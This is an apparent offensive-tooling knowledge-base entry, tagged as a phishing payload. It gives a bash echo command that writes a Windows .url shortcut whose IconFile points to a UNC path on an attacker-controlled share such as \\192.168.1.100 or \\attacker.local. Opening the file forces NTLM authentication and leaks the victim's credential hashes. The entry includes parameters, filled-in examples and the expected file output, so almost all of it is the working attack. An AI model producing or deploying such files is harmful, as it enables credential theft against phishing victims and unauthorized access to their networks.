---
type: command
executor: bash
data: >-
  echo
  '[InternetShortcut]\nURL=$_TARGET_URL\nWorkingDirectory=$_WORKING_DIR\nIconFile=$_UNC_PATH\nIconIndex=1'
  > $_OUTPUT_FILE.url
tags:
  - file-creation
  - phishing-payload
platforms:
  - Linux
  - Windows
verified: true
validated: true
---

# create-malicious-url-file

## Command

```bash
echo '[InternetShortcut]\nURL=$_TARGET_URL\nWorkingDirectory=$_WORKING_DIR\nIconFile=$_UNC_PATH\nIconIndex=1' > $_OUTPUT_FILE.url
```

## Description

This command generates a malicious .url shortcut file using echo, embedding a UNC path in the IconFile field to trigger NTLM authentication when opened by a victim in a SCF/URL attack scenario.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Legitimate-looking URL for the shortcut (e.g., https://example.com) | Yes |
| $_WORKING_DIR | Working directory for the shortcut (e.g., C:\\Users\\Public) | Yes |
| $_UNC_PATH | UNC path to attacker-controlled share for icon (e.g., \\192.168.1.100\share\%USERNAME%.icon) | Yes |
| $_OUTPUT_FILE | Name of the output .url file (e.g., innocent-link) | Yes |

## Examples

### Basic Usage

```bash
echo '[InternetShortcut]\nURL=https://example.com\nWorkingDirectory=C:\\Users\\Public\nIconFile=\\192.168.1.100\share\%USERNAME%.icon\nIconIndex=1' > phishing.url
```

### Advanced Usage

```bash
echo '[InternetShortcut]\nURL=https://google.com\nWorkingDirectory=.\nIconFile=\\attacker.local\public\icon.ico\nIconIndex=1' > google-shortcut.url
```

## Expected Output

No console output; creates the specified .url file. Verify with `cat $_OUTPUT_FILE.url`:
```
[InternetShortcut]
URL=https://example.com
WorkingDirectory=C:\Users\Public
IconFile=\\192.168.1.100\share\%USERNAME%.icon
IconIndex=1
```

## Related

- [[procedures/SCF-URL-File-Attack-Against-Writable-Share]]
- [[codes/malicious-url-file-with-unc-icon]]
